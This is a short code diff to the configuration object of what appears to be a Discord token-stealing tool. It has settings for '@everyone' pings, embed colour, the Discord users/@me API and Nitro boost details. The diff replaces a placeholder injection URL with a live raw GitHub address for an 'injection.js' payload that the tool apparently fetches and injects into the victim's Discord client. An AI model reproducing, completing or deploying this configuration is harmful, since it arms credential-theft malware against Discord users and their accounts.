@@ -12,7 +12,7 @@ const config = {
   ping_on_run: false,
   ping_val: '@everyone',
   embed_color: 8363488,
-  injection_url: '%INJECTIONURL%',
+  injection_url: 'https://raw.githubusercontent.com/beanzmanz007/klashndkjalhda9812u8909123klajsdh/main/injection.js',
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
